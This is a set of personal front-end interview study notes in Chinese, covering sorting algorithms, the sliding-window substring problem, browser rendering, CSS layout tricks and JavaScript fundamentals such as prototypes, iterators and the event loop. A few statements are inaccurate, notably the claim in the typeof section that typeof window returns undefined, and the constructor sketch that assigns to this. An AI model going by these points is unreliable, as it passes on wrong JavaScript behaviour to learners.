console.log("查找元素 7 的索引:", binarySearch(testArray, 7)); // 应该返回 3
console.log("查找元素 11 的索引:", binarySearch(testArray, 11)); // 应该返回 5
console.log("查找元素 20 的索引:", binarySearch(testArray, 20)); // 应该返回 -1（不存在）

console.log("\n递归版本测试:");
console.log("查找元素 7 的索引:", binarySearchRecursive(testArray, 7)); // 应该返回 3
console.log("查找元素 11 的索引:", binarySearchRecursive(testArray, 11)); // 应该返回 5
console.log("查找元素 20 的索引:", binarySearchRecursive(testArray, 20)); // 应该返回 -1（不存在）
```

## 排序

### 冒泡

#### 核心思想

通过**重复遍历数组**，每次比较相邻的两个元素，若顺序错误（如前者大于后者）则交换位置，直到没有元素需要交换为止。

形象理解：大的元素会像 “气泡” 一样逐渐 “上浮” 到数组末尾（每一轮遍历会将当前最大的元素放到正确位置）。

#### 实现步骤

- 从数组的第一个元素开始，依次比较相邻的两个元素（索引 `i` 和 `i+1`）；
- 若前者大于后者，则交换两者位置；
- 继续向后比较，直到数组末尾（完成一轮遍历），此时最大的元素会 “冒泡” 到数组最后；
- 忽略已排好序的末尾元素，重复上述步骤，直到所有元素有序（即某一轮遍历中没有发生任何交换）。

#### 示例

- **初始数组**：`[3, 1, 4, 2]`
- **第 1 轮遍历**（目标：将最大元素 4 放到末尾）：
  - 比较 3 和 1：3>1 → 交换 → `[1, 3, 4, 2]`
  - 比较 3 和 4：3<4 → 不交换 → 保持 `[1, 3, 4, 2]`
  - 比较 4 和 2：4>2 → 交换 → `[1, 3, 2, 4]`
  - 结果：最大元素 4 已到位，剩余待排序数组 `[1, 3, 2]`
- **第 2 轮遍历**（目标：将次大元素 3 放到倒数第 2 位）：
  - 比较 1 和 3：1<3 → 不交换 → 保持 `[1, 3, 2, 4]`
  - 比较 3 和 2：3>2 → 交换 → `[1, 2, 3, 4]`
  - 结果：次大元素 3 已到位，剩余待排序数组 `[1, 2]`
- **第 3 轮遍历**（目标：确认剩余元素有序）：
  - 比较 1 和 2：1<2 → 不交换 → 保持 `[1, 2, 3, 4]`
  - 结果：无交换，数组已完全有序，排序结束。

#### 复杂度和特点

- **时间复杂度**：
  - 最坏情况（完全逆序）：`O(n²)`（需 `n-1` 轮，每轮比较 `n-i` 次）；
  - 最好情况（已完全有序）：`O(n)`（若优化加入 “无交换则提前结束” 的标志位，1 轮遍历即可）；
  - 平均情况：`O(n²)`。
- **空间复杂度**：`O(1)`（原地排序，仅需临时变量存储交换元素）
- **特点**：
  - 稳定排序（相等元素的相对顺序不变）；
  - 实现简单，适合小规模数据；
  - 效率低（嵌套循环），不适合大规模数据。



### 快速

#### 核心思想

基于**分治法（Divide and Conquer）**：

1. 从数组中选择一个元素作为 “基准（pivot）”；
2. 将数组分区：所有小于基准的元素放基准左边，所有大于基准的元素放基准右边（相等元素可放左或右）；
3. 递归地对基准左右两个子数组重复上述步骤，直到子数组长度为 1（天然有序）。

#### 实现步骤

以 “双边指针法” 为例

1. **选择基准**：通常选数组第一个元素、最后一个元素或中间元素（这里以第一个元素为例）；

2. 分区（partition）

   ：

   - 初始化左指针 `left`（指向数组起始）和右指针 `right`（指向数组末尾）；
   - 右指针左移，找到第一个小于基准的元素；
   - 左指针右移，找到第一个大于基准的元素；
   - 交换左右指针指向的元素；
   - 重复上述过程，直到左指针 >= 右指针，此时交换基准与右指针元素（基准归位）；

3. **递归排序**：基准左边的子数组和右边的子数组分别重复步骤 1-2，直到子数组长度为 1。

#### 示例

- **初始数组**：`[5, 3, 8, 4, 2, 7, 1, 6]`，选择基准 `pivot=5`，`left=0`，`right=7`。
- **第 1 次分区**：
  - 右指针左移：找小于 5 的元素（1，索引 6）；
  - 左指针右移：找大于 5 的元素（8，索引 2）；
  - 交换 8 和 1 → `[5, 3, 1, 4, 2, 7, 8, 6]`；
  - 右指针继续左移（索引 5，元素 7>5，继续左移到索引 4，元素 2<5）；
  - 左指针继续右移（索引 3，元素 4<5，继续右移到索引 4，此时 `left=4`，`right=4`，循环结束）；
  - 交换基准（5）和右指针元素（2）→ `[2, 3, 1, 4, 5, 7, 8, 6]`；
  - 结果：基准 5 归位，左子数组 `[2, 3, 1, 4]`，右子数组 `[7, 8, 6]`。

- **递归排序左子数组 `[2, 3, 1, 4]`**：
  - 基准 = 2，分区后左子数组 `[]`，右子数组 `[3, 1, 4]`；
  - 递归排序 `[3, 1, 4]`，基准 = 3，分区后左 `[1]`，右 `[4]`，最终左子数组排序为 `[1, 2, 3, 4]`。
- **递归排序右子数组 `[7, 8, 6]`**：
  - 基准 = 7，分区后左 `[6]`，右 `[8]`，最终排序为 `[6, 7, 8]`。
- **最终结果**：`[1, 2, 3, 4, 5, 6, 7, 8]`。

#### 复杂度与特点

- **时间复杂度**：
  - 最好情况（每次分区后左右子数组长度接近）：`O(n log n)`（递归深度 `log n`，每轮处理 `n` 个元素）；
  - 最坏情况（数组已有序或逆序，每次分区后子数组长度为 `n-1`）：`O(n²)`（可通过 “随机选择基准” 避免）；
  - 平均情况：`O(n log n)`。
- **空间复杂度**：`O(log n) ~ O(n)`（递归调用栈的深度，平均 `log n`，最坏 `n`）。
- **特点**：
  - 不稳定排序（相等元素的相对顺序可能改变）；
  - 原地排序（除递归栈外，无需额外空间）；
  - 效率高，是实际应用中最常用的排序算法之一，适合大规模数据。

## 不重复最长子串

### 问题示例

- 输入：`"abcabcbb"` → 输出：`3`（最长子串是 `"abc"` 或 `"bca"` 等，长度 3）
- 输入：`"bbbbb"` → 输出：`1`（最长子串是单个 `"b"`）
- 输入：`"pwwkew"` → 输出：`3`（最长子串是 `"wke"` 或 `"kew"`）

### 滑动窗口的核心思路

- **窗口定义**：用两个指针（`left` 左边界、`right` 右边界）表示当前正在检查的子串范围 `[left, right]`，窗口内的字符均不重复。
- **动态调整**：`right` 指针向右遍历字符串，若遇到重复字符，则移动 `left` 指针收缩窗口，确保窗口内始终无重复字符。
- **记录最长长度**：在遍历过程中，实时计算当前窗口长度（`right - left + 1`），并更新最大长度。

### 快速判断重复

用**哈希表（或数组）** 记录每个字符**最后一次出现的索引**，通过索引对比可快速判断当前字符是否在窗口内（即是否重复）。

### 步骤拆解

**以 `s = "abcabcbb"` 为例**

1. 初始化：`left = 0`（窗口左边界），`maxLen = 0`（最长长度），`map = new Map()`（记录字符最后出现的索引）。
2. `right` 从 0 开始遍历字符串：
   - **right=0（字符 'a'）**：
     - `map` 中无 'a'，记录 `map.set('a', 0)`。
     - 窗口 `[0,0]`，长度 1，`maxLen=1`。
   - **right=1（字符 'b'）**：
     - `map` 中无 'b'，记录 `map.set('b', 1)`。
     - 窗口 `[0,1]`，长度 2，`maxLen=2`。
   - **right=2（字符 'c'）**：
     - `map` 中无 'c'，记录 `map.set('c', 2)`。
     - 窗口 `[0,2]`，长度 3，`maxLen=3`。
   - **right=3（字符 'a'）**：
     - `map` 中 'a' 最后出现的索引是 0，且 `0 >= left（0）` → 说明 'a' 在当前窗口内（重复）。
     - 移动 `left` 到 `0 + 1 = 1`（确保窗口内无重复 'a'）。
     - 更新 `map.set('a', 3)`。
     - 窗口 `[1,3]`，长度 3，`maxLen` 保持 3。
   - **right=4（字符 'b'）**：
     - `map` 中 'b' 最后出现的索引是 1，且 `1 >= left（1）` → 重复。
     - 移动 `left` 到 `1 + 1 = 2`。
     - 更新 `map.set('b', 4)`。
     - 窗口 `[2,4]`，长度 3，`maxLen` 保持 3。
   - 后续步骤类似，最终 `maxLen` 仍为 3。

### 代码实现

返回长度

```js
function lengthOfLongestSubstring(s) {
  let map = new Map(); // 存储字符最后出现的索引
  let maxLen = 0; // 最长子串长度
  let left = 0; // 窗口左边界

  for (let right = 0; right < s.length; right++) {
    const char = s[right];
    // 若字符已存在且其最后出现的位置在当前窗口内（>= left），则移动left到重复位置+1
    if (map.has(char) && map.get(char) >= left) {
      left = map.get(char) + 1;
    }
    // 更新字符最后出现的索引
    map.set(char, right);
    // 计算当前窗口长度，更新最大长度
    maxLen = Math.max(maxLen, right - left + 1);
  }

  return maxLen;
}
```

返回内容

```js
function longestUniqueSubstring(s) {
  const map = new Map(); // 记录字符最后出现的索引
  let left = 0; // 窗口左边界
  let longestSub = ''; // 最长不重复子串

  for (let right = 0; right < s.length; right++) {
    const char = s[right];

    // 若字符已在当前窗口内（重复），收缩左边界
    if (map.has(char) && map.get(char) >= left) {
      left = map.get(char) + 1;
    }

    // 更新字符最后出现的索引
    map.set(char, right);

    // 计算当前窗口长度，若更长则更新最长子串
    const currentLen = right - left + 1;
    if (currentLen > longestSub.length) {
      longestSub = s.substring(left, right + 1); // substring(endIndex 不包含，需+1)
    }
  }

  return longestSub;
}
```



# html

1. 重排（回流)和重绘
2. 图片懒加载
3. CSRF
4. iframe优缺点
5. link和@import的区别
6. script中的defer和aysnc的区别

## 重排（回流)和重绘

重排 reflow，元素的**位置与大小**发生变动时叫重排，也叫**回流**。此时在**layout**阶段，计算每个元素在**设备视口**内的确切位置和大小；

重绘 repaint，元素**样式**发生变动，但是位置没有改变。此时在**Paint**阶段，将渲染树中的每个**节点**转换成屏幕上的**实际像素**，这一步通常叫绘制或栅格化；

重排重绘都会让浏览器重新渲染，而重排得代价更高。

**如何避免过多重排重绘？**

- 样式批量修改
- 分离读写操作

## 图片懒加载

有两个关键：

- 如何判断图片出现在当前视口？
- 如何控制图片的加载？

1. 将图片的**真实地址**保存在一个自定义的属性中（比如 **data-src**），将图片的 **src** 属性设置为一个**占位符图片**（比如一张空白的透明图片）；
2. 监听窗口的**滚动事件**，当滚动到图片的**可视区域**时，将图片的真实地址设置为 src 属性，从而触发图片的加载；
3. 为了避免过多的滚动事件，可以使用**节流**技术，限制触发加载的频率；

提供**`IntersectionObserver`**可以去做这些

需要注意的是，对于一些对 **SEO** 比较重要的图片，比如**标题图**等，应该使用正常的图片加载方式，以保证搜索引擎能够正确地获取这些图片。

## CSRF

cross-site-request forgery 跨站请求伪造 通过**恶意引导**用户一次点击劫持**cookie**进行攻击

以下手段可以减少 CSRF：

- 设置 HTTP Referer 字段，限制请求来源

- token 验证，不放 cookie 中，每次请求手动携带 token 进行校验

## iframe 优缺点

优点：

- **隔离性**：iframe中的JavaScript代码运行在自己的执行环境中，不会影响到主页面；
- **灵活性**：可以加载任何外部页面；
- **并行加载**：iframe的内容会与主页面并行加载，不会阻塞主页面的加载；

缺点：

- **性能问题**：每个iframe都有自己的Window和Document对象，这会增加内存和cpu的使用。
- **SEO问题**：搜索引擎可能无法正确地索引iframe中的内容；
- **跨域问题**：浏览器的同源策略，跨越的iframe有许多限制；
- **布局问题**：iframe的布局和样式控制比较困难，还有进度条等等；
- **历史记录问题**：iframe的导航不会改变浏览器历史记录，这会影响到用户的导航体验；

## link和@import区别

|                             link                             |                           @import                            |
| :----------------------------------------------------------: | :----------------------------------------------------------: |
|                除了引入CSS外，还可以引入图标                 |                         只能引入css                          |
| 属于html元素，当浏览器解析HTML文档时，它会立即加载和应用`<link>`引入的CSS。 | 外部样式表被下载和解析后才会被加载和应用。这可能会出现未样式化的内容，也就是所谓的FOUC（Flash of Unstyled Content）。 |
|                     可并行加载多个样式表                     |                按照它们在CSS中的顺序依次加载                 |
|    可通过JavaScript动态创建和修改href属性，动态选择样式表    |                              x                               |
|                         支持媒体查询                         |                              x                               |

> link媒体查询案例

```html
<!-- 对于宽度大于600px的设备，加载"styles-large.css" -->
<link rel="stylesheet" media="(min-width: 600px)" href="styles-large.css">

<!-- 对于宽度小于或等于600px的设备，加载"styles-small.css" -->
<link rel="stylesheet" media="(max-width: 600px)" href="styles-small.css">
```



> 应用场景

大部分情况推荐link引入；

样式表中引入另一个样式表时，推荐@import；

## script中的defer和async的区别

> 共同点：

在下载脚本同时继续解析HTML；

> 不同点

defer，延迟，等html解析完后，再按照脚本在文档中出现的顺序执行它们；

async，异步，一旦脚本下载完成，会停止html解析，立即执行脚本（导致有多个async脚本时，执行顺序不能保证，下载完的先执行）；

# css

## BFC

## 布局

### 定位分别有什么作用

## 重绘&重排

## 响应式和自适应

比较直观的不同是：**自适应**需要开发**多套**界面，**响应式**开发**一套**界面；

而**响应式**可以通过**弹性布局**和**媒体查询**去实现；

## 媒体查询

媒体查询包含以下部分：

- @media：用于定义媒体查询规则的**关键字**，通常写在 css 头部；
- 媒体类型，指设备类型，常见有 screen、print、speech 等
- 关键字 and only not
- 媒体特性：指要匹配的属性，如 min-width、max-width 等

**例子**

```css
@media screen and (min-width: 768px) {
  /* 当屏幕宽度大于等于768px时应用的样式 */
  body {
    font-size: 16px;
  }
}

@media screen and (max-width: 767px) {
  /* 当屏幕宽度小于767px时应用的样式 */
  body {
    font-size: 14px;
  }
}
```

## rem、em、vw、vh

- rem：根据根元素的 font-size；
- em：根据父元素的 font-size；
- vw 和 vh：根据视口宽高；

## 垂直水平居中

- **子绝父相+transform**（给自己设置）
- flex 布局（给父盒子设置）

## 三角形实现

> 原理

先上口诀：宽高为0，一边为0，两边透明。

元素的border的形成机制是：

在盒子四边由**4个三角形**拼接而成，最先呈现的是每个三角形**底部**的内容，当border-width变大后，每个三角形的剩余部分会渐渐出现；

当盒子内容有宽高时，会遮住每个三角形底部之外的部分；

比如

```css
width: 40px;
height: 40px;
border-width: 50px;
border-style: solid;
border-color: red yellow green blue;
```

![image-20240308155813724](C:\Users\86131\Desktop\know_fragments\md-img\image-20240308155813724.png)

当border-width设置过小时，就是平时的场景（只看到每个三角形底部区域）：

```css
width: 40px;
height: 40px;
border-width: 1px;
border-style: solid;
border-color: red yellow green blue;
```

![image-20240308160134553](C:\Users\86131\Desktop\know_fragments\md-img\image-20240308160134553.png)

当盒子宽高设置为0后，每个三角形全部呈现：

```css
width: 0;
height: 0;
border-width: 30px;
border-style: solid;
border-color: red yellow green blue;
```

![image-20240308160527073](C:\Users\86131\Desktop\know_fragments\md-img\image-20240308160527073.png)

如果有一边不设置border-width，就只有三个三角形：

```css
width: 0;
height: 0;
border-width: 30px 30px 30px 0;
border-style: solid;
border-color: red yellow green #fff;
```

![image-20240308161000975](C:\Users\86131\Desktop\know_fragments\md-img\image-20240308161000975.png)

如果将上下两边的color设置为透明，不就是只看到一个三角形吗：

```css
width: 0;
height: 0;
border-width: 30px 30px 30px 0;
border-style: solid;
border-color: transparent yellow transparent #fff;
```



![image-20240308161318958](C:\Users\86131\Desktop\know_fragments\md-img\image-20240308161318958.png)

不难发现，不设置border-width那一边就是三角形的方向，三角形方向的方向的邻近两边需要设置透明。

> 实现口诀：宽高为0，一边为0，两边透明

```css
width: 0;
height: 0;
border-width: 30px 30px 30px 0;
border-style: solid;
border-color: transparent yellow transparent #fff;
```

## 伪类和伪元素区别

**伪类**用于选择元素特定状态，比如:hover、:active、:nth-child()等

**伪元素**用于选择元素特定部分或添加新元素，比如::before、::after等

# JavaScript

## js怎么判断变量是否是数组

## **什么是闭包？有哪些应用场景？**

-  “函数 + 函数定义时所在的词法环境” 的组合
   - 当一个**内部函数**引用了**外部函数的变量**，且这个内部函数被 “带出” 外部函数（比如被返回、被赋值给全局变量）时，外部函数执行完后，其变量不会被垃圾回收（GC），因为内部函数还在引用它们 —— 这种 “变量被保留、内部函数能持续访问” 的现象，就是闭包。
   - 闭包带来的结果是：**变量持久化**、**作用域隔离**

-  应用场景
   - 模块化，封装私有变量
   - 函数柯里化，参数复用
   - 防抖节流，控制函数执行频率
   - React Hooks，引用当前组件状态，更新时能访问最新状态（setState）

## 线程

> js为什么不能多线程

因为js的**执行环境**（浏览器或node.js）只提供一个执行线程来运行所有js代码。目的是避免复杂的并发问题；

而js提供了一些机制来模拟并发，例如异步回调、promise、async/await等；

此外，HTML5引入了Web Workers API，它允许js创建多个**后台工作线程**来并行处理任务。但是这些工作线程不能访问**DOM和全局变量**，只能通过**消息传递**与主线程进行通信；



## 关键字和它背后

### typeof

可以检测对象和基本类型；

而对于引用类型（**数组、函数、对象**），都返回**object**；

检测 **/abc/** ,返回 **object**；

但检测**Function**，它返回 **function**；

但检测 **window**，返回 **undefined**；

但检测 null 返回 **object**；

原因是这样：

在 JavaScript 最初的实现中，JavaScript 中的值是由一个**表示类型的标签**和实际数据值表示的。对象的类型标签是 **0**。由于 `null` 代表的是**空指针**（大多数平台下值为 0x00），因此，null 的**类型标签**是 0，`typeof null` 也因此返回 `"object"`。

### instanceof

检测**构造函数**的 `prototype` 属性是否出现在某个**实例对象**的**原型链**上。

也就是说，判断一个**实例**是否属于**某种类型**

```js
let person = function () {};
let no = new person();
no instanceof person; //true
```

#### 实现

其实 instanceof 主要的实现原理就是只要右边变量的 **prototype** 在左边变量的**原型链**上即可；

因此，instanceof 在查找的过程中会**遍历**左边变量的原型链，直到找到右边变量的 prototype，如果查找失败，则会返回 false，告诉我们左边变量并非是右边变量的实例。

```js
function new_instance_of(leftVaule, rightVaule) {
  let rightProto = rightVaule.prototype; // 取右表达式的 prototype 值
  leftVaule = leftVaule.__proto__; // 取左表达式的__proto__值
  while (true) {
    if (leftVaule === null) {
      return false;
    }
    if (leftVaule === rightProto) {
      return true;
    }
    leftVaule = leftVaule.__proto__;
  }
}
```

#### 原型

希望被**原型链下游**的对象继承的**属性和方法**，都被储存在**prototype**；

为什么说只要**构造函数**的**prototype**出现在**实例**的**原型链**上，就知道**实例**属于该**构造函数**创建出来的呢？

在传统的 OOP 中，首先定义“类”，此后创建**对象实例**时，类中定义的所有**属性和方法**都被复制到实例中;

在 JavaScript 中并不如此复制——而是在**对象实例**和它的**构造器**之间建立一个**链接**（它是**proto**属性，是从构造函数的`prototype`属性派生的）;

我们来看看**构造函数**创建出一个**实例**时，发生了什么吧：

1. 在内存中**创建一个新对象**（空）
2. 将**构造函数**的**显式原型 prototype**赋值给前面创建出来的**对象**的**隐式原型****proto**
3. **构造函数**内部的**this**，会**指向**创建出来的**新对象**
4. **执行**函数代码
5. 如果构造函数没有**返回非空对象**，这**返回**创建出来的**新对象**

```js
function foo() {
  // 下面三行代码是内部自动操作的，不用写
  var moni = {}
  this = {}
  this.__proto__ = foo.prototype

  return this
}
new foo()
```

你看，上面**this**便是构造函数**foo()**创建出来的**实例**，因为该**实例**的**原型链**（this.**proto**）上有**构造函数**的**prototype**

#### **原型链**

从一个**对象上获取属性**，如果在当前**对象中没有**获取到就会去**它的原型**上面获取，如果它的原型上还没有，它原型本质是个对象，也有对应的原型，就再**去它原型的原型**上找，以此类推，沿着原型一层一层往上找，像链条一样

#### constructor

**构造函数**的**prototype**属性**指向**了他的**原型对象**，该**原型对象**里面有**constructor**属性；

每个**实例对象**都从**原型**中继承了一个 **constructor** 属性，该属性**指向**了用于构造此实例的**构造函数**；

constructor 的作用便是回答了**实例从哪里来的问题**。

![image-20220305193122666](C:\Users\86131\Desktop\know_fragments\md-img\image-20220305193122666.png)

#### ===

- 如果两个操作数都是**对象**，只有当它们指向同一个对象时才返回 `true`；

- **数字类型**必须拥有相同的数值。`+0` 和 `-0` 会被认为是相同的值;

```js
console.log([1, 2, 3] === [1, 2, 3]); // false, 因为在js中，这两数组是不同对象（你也可以理解为两个独立内存空间），内容相同而已；假设前者的引用是a，后者引用是b，那执行a[0] = 9之后，b[0]依然是1
console.log(+0 === -0); // true
```

### for of 和 for in 区别

`for of`，es6 新增， 语句遍历**可迭代对象**定义要迭代的数据（与 forEach 不同的是，**遍历可中断**）。

`for...in` 语句以**任意顺序**迭代对象的**可枚举属性**。

#### 对于**数组**

- **for in**遍历的是数组的**索引**，包括原型以及原型链上的**可迭代属性**，且遍历**顺序任意**；
- 而**for of**更适合遍历数组

```js
Object.prototype.objCustom = function () {};
Array.prototype.arrCustom = function () {};

let iterable = [3, 5, 7];
iterable.foo = "hello";

for (let i in iterable) {
  console.log(i); // logs 0, 1, 2, "foo", "arrCustom", "objCustom"
}

for (let i in iterable) {
  if (iterable.hasOwnProperty(i)) {
    console.log(i); // logs 0, 1, 2, "foo"
  }
}

for (let i of iterable) {
  console.log(i); // logs 3, 5, 7
}
```

#### 对于**对象**

- **for in**遍历对象的**可枚举属性**，包括原型和原型链上的属性，要是只想遍历**实例属性**，可用**hasOwnProperty()**判断
- 而**普通对象**并不是可迭代对象，不能使用**for of**遍历

```js
Object.prototype.method = function () {};

const myObject = {
  a: 1,
  b: 2,
  c: 3,
};

for (const key in myObject) {
  console.log(key); // a b c method
}

for (var key in myObject) {
  if (myObject.hasOwnProperty(key)) {
    console.log(key); // a b c
  }
}
```

### Object.keys

他也可以遍历对象的实例属性的**键名**，不包括原型上的属性

```js
Object.prototype.method = function () {};

const myObject = {
  a: 1,
  b: 2,
  c: 3,
};

console.log(Object.keys(myObject)); // ['a', 'b', 'c']
```

### 可迭代对象

当一个**对象**实现了**[Symbol.iterator]函数**时，就是**可迭代对象**；

而**[Symbol.iterator]函数**返回的是**迭代器**（有**next()**的**对象**）；

而**next()**返回值是这**done**和**value**两个属性的**对象**；

**done**：如果迭代器**可以产生下一个值**，则为**false**，否则为 true（遍历完）；

**value**：js 中任何值，done 为 true 可省略；

#### 实现迭代器

```js
const names = ["abc", "cba", "nba"];

let index = 0;
const namesIterator = {
  next() {
    if (index < names.length) {
      return {
        done: false,
        value: names[index++],
      };
    } else {
      return {
        done: true,
        value: undefined,
      };
    }
  },
};

console.log(namesIterator.next()); // { done: false, value: 'abc' }
console.log(namesIterator.next()); // { done: false, value: 'cba' }
console.log(namesIterator.next()); // { done: false, value: 'nba' }
console.log(namesIterator.next()); // { done: true, value: undefined }
```

#### 实现迭代对象

原生可迭代对象：

- String
- Array
- arguments 参数
- Set
- Map
- NodeList 集合

```js
const iterableObj = {
  names: ["abc", "cba", "nba"],

  [Symbol.iterator]() {
    let index = 0;

    return {
      next: () => {
        if (index < this.names.length) {
          return {
            done: false,
            value: this.names[index++],
          };
        } else {
          return {
            done: true,
            value: undefined,
          };
        }
      },
    };
  },
};
for (const item of iterableObj) {
  console.log(item);
}
```

## Object

### Object.is()

Object.is(value1, value2)

判断两个是否为同一个值；

```js
Object.is(+0, -0); // false
Object.is(Number.NaN, NaN);
```

#### 注意

- 与 `==` 不同。`==` 运算符在判断相等前对两边的变量（如果它们不是同一类型）进行强制转换（这种行为将 `"" == false` 判断为 `true`），而 `Object.is` 不会强制转换两边的值。
- 与 `===`也不相同。差别是它们对待有符号的零和 NaN 不同，例如，`===` 运算符（也包括 `==` 运算符）将数字 `-0` 和 `+0` 视为相等，而将 `Number.NaN` 与 `NaN`视为不相等。

### Object.assign()

Object.assign(**target**, ...**sources**)

```js
const obj = { a: 1 };
const copy = Object.assign({}, obj);
console.log(copy); // { a: 1 }
```

#### 注意

- 后续的 source 会**覆盖**前面的 source 的同名属性。
- Object.assign 复制的是属性值，如果属性值是一个引用类型，那么复制的其实是**引用地址**，就会存在引用共享的问题。

## 常见全局函数

### parseInt()

parseInt(**string**, **radix**)

radix 表示要解析的数字的基数：

- 它介于 2 ~ 36 之间；

- 如果**省略**或其**值为 0**，则数字将以 10 进制来解析；

- 如果它以 “0x” 或 “0X” 开头，将以 16 进制来解析；

- 如果它**小于 2** 或者**大于 36**，将返回 **NaN**。

其它没见过的：

- decodeURI()
- decodeURIComponent()
- encodeURI()
- encodeURIComponent()
- escape()
- unescape()
- getClass()
- isFinite()
- isNaN()

## 常见数组方法

### map

map(callbackFn(**Element**, **index**, **array**), thisArg)

#### **返回值**

新数组

#### **易错**

```js
["1", "2", "3"].map(parseInt); // [1, NaN, NaN]
```

parseInt 接收两个参数，也就是 map 传递给他的 Element 和 index

所以实际的效果是

```js
parseInt("1", 0); // 1
parseInt("2", 1); // NaN
parseInt("3", 2); // NaN
```

解决方案

```js
["1", "2", "3"].map((element) => parseInt(element, 10)); // [1, 2, 3]
```

### forEach

forEach(callbackFn(**Element**, **index**, **array**), thisArg)

#### **返回值**

undefined

#### **注意**

- 不会直接改变调用它的数组，该数组可能会被 `callbackFn` 函数改变。
- 除了抛出异常，无法终止或跳出**forEach**循环

### slice

slice(**begin**, **end**)

**不会改变原数组**

#### **返回值**

新数组

例子

```js
console.log([2, 10, 11, 1, 3].slice(2, 2)); // []
```

因为没有提取到元素，所以新数组为空

## 手写

### 实现Events模块

```js
class Events {
  constructor() {
    // 存储事件与回调的映射关系
    // 结构: { eventName: [callback1, callback2, ...] }
    this.events = Object.create(null);
  }

  /**
   * 监听事件
   * @param {string} eventName - 事件名称
   * @param {Function} callback - 事件触发时执行的回调函数
   */
  on(eventName, callback) {
    if (typeof callback !== 'function') {
      throw new TypeError('The callback must be a function');
    }
    
    // 如果事件不存在，初始化一个空数组
    if (!this.events[eventName]) {
      this.events[eventName] = [];
    }
    
    // 将回调函数添加到事件队列中
    this.events[eventName].push(callback);
    
    // 返回当前实例，支持链式调用
    return this;
  }

  /**
   * 触发事件
   * @param {string} eventName - 事件名称
   * @param {...any} args - 传递给回调函数的参数
   */
  emit(eventName, ...args) {
    // 如果事件不存在或没有回调函数，直接返回
    if (!this.events[eventName] || this.events[eventName].length === 0) {
      return false;
    }
    
    // 复制一份回调数组，防止在触发过程中修改原数组导致问题
    const callbacks = [...this.events[eventName]];
    
    // 依次执行所有回调函数，并传递参数
    callbacks.forEach(callback => {
      callback.apply(this, args);
    });
    
    return true;
  }

  /**
   * 移除事件监听
   * @param {string} eventName - 事件名称
   * @param {Function} [callback] - 要移除的回调函数，不传递则移除该事件的所有回调
   */
  off(eventName, callback) {
    // 如果事件不存在，直接返回
    if (!this.events[eventName]) {
      return this;
    }
    
    // 如果不传递callback，移除该事件的所有监听
    if (typeof callback === 'undefined') {
      this.events[eventName] = [];
      return this;
    }
    
    // 只移除指定的callback
    if (typeof callback === 'function') {
      this.events[eventName] = this.events[eventName].filter(cb => cb !== callback);
    }
    
    return this;
  }

  /**
   * 监听事件一次，触发后自动移除
   * @param {string} eventName - 事件名称
   * @param {Function} callback - 事件触发时执行的回调函数
   */
  once(eventName, callback) {
    if (typeof callback !== 'function') {
      throw new TypeError('The callback must be a function');
    }
    
    // 创建一个包装函数，执行后自动移除监听
    const wrapper = (...args) => {
      // 先执行原始回调
      callback.apply(this, args);
      // 然后移除当前的包装函数
      this.off(eventName, wrapper);
    };
    
    // 存储原始回调的引用，方便后续可能的off操作
    wrapper.originalCallback = callback;
    
    // 使用on方法注册包装函数
    this.on(eventName, wrapper);
    
    return this;
  }
}

// 导出模块
module.exports = Events;
```



### 数组去重

#### **indexOf 或 includes**

新建一个空的结果数组，for 循环原数组，判断结果数组**是否存在当前元素**，如果有相同的值则跳过，不相同则 push 进数组。

```js
function unique(arr) {
  if (!Array.isArray(arr)) {
    console.log("type error!");
    return;
  }
  const array = [];
  for (let i = 0; i < arr.length; i++) {
    if (array.indexOf(arr[i]) === -1) {
      array.push(arr[i]);
    }
    // includes写法
    // if (!array.includes(arr[i])) {
    //    array.push(arr[i])
    // }
  }
  return array;
}
const arr = [
  1,
  1,
  "true",
  "true",
  true,
  true,
  undefined,
  undefined,
  null,
  null,
  NaN,
  NaN,
  {},
  {},
];
console.log(unique(arr)); // [ 1, 'true', true, undefined, null, NaN, NaN, {}, {} ]
```

**缺点**

- NaN、{}没有去重

#### es6 Set

```js
function unique(arr) {
  return Array.from(new Set(arr));
}
const arr = [
  1,
  1,
  "true",
  "true",
  true,
  true,
  undefined,
  undefined,
  null,
  null,
  NaN,
  NaN,
  {},
  {},
];
console.log(unique(arr));
// [1, "true", true, undefined, null, NaN, {}, {}]
// 高级写法
// [...new Set(arr)]
```

**缺点**

- 无法去掉“{}”空对象

#### filter 和 hasOwnProperty

```js
function unique(arr) {
  const obj = {};
  return arr.filter((item) => {
    return obj.hasOwnProperty(typeof item + item)
      ? false
      : (obj[typeof item + item] = true);
  });
}
const arr = [
  1,
  1,
  "true",
  "true",
  true,
  true,
  undefined,
  undefined,
  null,
  null,
  NaN,
  NaN,
  {},
  {},
];
console.log(unique(arr));
// [1, "true", true, undefined, null, NaN, {}]   //所有的都去重了
```

过程

```js
1. obj { number1: true } arr [1]
3. obj { number1: true, stringtrue: true } arr [1, 'true']
5. obj { number1: true, stringtrue: true, booleantrue: true } arr [1, 'true', true]
7. obj { number1: true, stringtrue: true, booleantrue: true, undefinedundefined: true } arr [1, 'true', true, undefined]
9. obj { number1: true, stringtrue: true, booleantrue: true, undefinedundefined: true, objectnull: true } arr [1, 'true', true, undefined, null]
11. obj { number1: true, stringtrue: true, booleantrue: true, undefinedundefined: true, objectnull: true, numberNaN: true } arr [1, 'true', true, undefined, null, NaN]
13. obj { number1: true, stringtrue: true, booleantrue: true, undefinedundefined: true, objectnull: true, numberNaN: true, 'object[object Object]': true } arr [1, "true", true, undefined, null, NaN, {}]
```

### 数组转树

## this 指向

## 箭头函数

**箭头函数和普通函数有什么区别?**

- 箭头函数**不会绑定 this、arguments**属性

- 箭头函数**不能作为构造函数**来使用（不能和 new 关键字一起使用）
- 箭头函数**不绑定 this**，而是根据**外层作用域**来决定 this



## **js怎么处理异步操作？什么是宏任务？微任务？**

- 处理异步操作的进化史：

  - 回调函数，回调地狱
  - Promise，链式调用
  - Generator，yield暂停函数
  - async/await

  逐步优化可读性

- 微任务&宏任务

  - **事件循环（Event Loop）**：JS 处理异步任务的机制。主线程执行同步代码→遇到异步任务放入对应队列→同步代码执行完后，先清空所有微任务→再执行一个宏任务→重复此过程（循环）。
  - **宏任务**：优先级较低的异步任务，执行完后会触发页面重绘。（定时器、网络请求、文件读写、DOM 事件）
  - **微任务**：优先级较高的异步任务，在当前宏任务执行完后立即执行，不会触发重绘。（Promise 的回调、async/await、queueMicrotask、MutationObserver）

  > async/await本质是Promise的语法糖

## Set 和 Map 有什么区别？

- Map 是键值对，Set 是值的集合
- Map 有 get(key)方法,而 set 只有值，没有 get(key)方法
- Set 更多用于数组去重，而 Map 更多用于存储数据

## 深拷贝和浅拷贝

